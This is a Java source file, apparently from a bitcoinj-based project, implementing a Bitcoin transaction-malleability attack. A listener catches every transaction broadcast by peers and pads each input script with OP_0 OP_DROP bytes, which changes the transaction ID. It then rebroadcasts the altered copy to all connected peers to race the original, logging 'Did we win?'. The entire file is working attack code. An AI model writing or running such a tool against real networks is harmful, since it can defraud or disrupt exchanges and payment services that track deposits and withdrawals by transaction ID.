package shapedirection;

import java.io.ByteArrayOutputStream;
import org.bitcoinj.core.Peer;
import org.bitcoinj.core.Transaction;
import org.bitcoinj.core.TransactionInput;
import org.bitcoinj.core.TransactionOutput;
import org.bitcoinj.core.VarInt;
import org.bitcoinj.core.listeners.OnTransactionBroadcastListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.spongycastle.util.encoders.Hex;

import static java.lang.String.format;
import static org.bitcoinj.core.Utils.uint32ToByteStreamLE;

public class TransactionMutator implements OnTransactionBroadcastListener {
  private static final Logger log = LoggerFactory.getLogger(TransactionMutator.class);

  @Override public void onTransaction(Peer peer, Transaction tx) {
    log.info(format("Recv: %s (%s)", Hex.toHexString(tx.unsafeBitcoinSerialize()), tx.getHashAsString()));

    try {
      ByteArrayOutputStream out = new ByteArrayOutputStream();

      // version
      uint32ToByteStreamLE(tx.getVersion(), out);

      // inputs
      out.write(tx.getInputs().size());
      for (TransactionInput input : tx.getInputs()) {
        out.write(input.getOutpoint().unsafeBitcoinSerialize());
        byte[] script = input.getScriptBytes();
        if ((script[0] == 0x00) && (script[1] == 0x75)) {
          log.info("tx already mutated, returning.");
          return;
        }
        byte[] newScript = new byte[script.length + 2];
        newScript[0] = 0x00;
        newScript[1] = 0x75;
        for (int i=0; i<script.length; i++) {
          newScript[i+2] = script[i];
        }
        out.write(new VarInt(newScript.length).encode());
        out.write(newScript);
        uint32ToByteStreamLE(input.getSequenceNumber(), out);
      }

      // outputs
      out.write(tx.getOutputs().size());
      for (TransactionOutput output : tx.getOutputs()) {
        out.write(output.unsafeBitcoinSerialize());
      }

      // timelock
      uint32ToByteStreamLE(tx.getLockTime(), out);

      Transaction newTx = new Transaction(CryptoputtyApplication.config.getNetwork(), out.toByteArray());
      log.info(format("Send: %s (%s)", Hex.toHexString(newTx.unsafeBitcoinSerialize()), newTx.getHashAsString()));

      for (Peer p : CryptoputtyApplication.kit.peerGroup().getConnectedPeers()) {
        try {
          p.sendMessage(newTx);
        } catch (Exception e) {
          log.error("Caught exception sending to {}", p, e);
        }
      }

      log.info("Done mutating. Did we win?");
    } catch (Exception e) {
      log.error("Failed to mutate transaction.");
      e.printStackTrace();
    }
  }
}
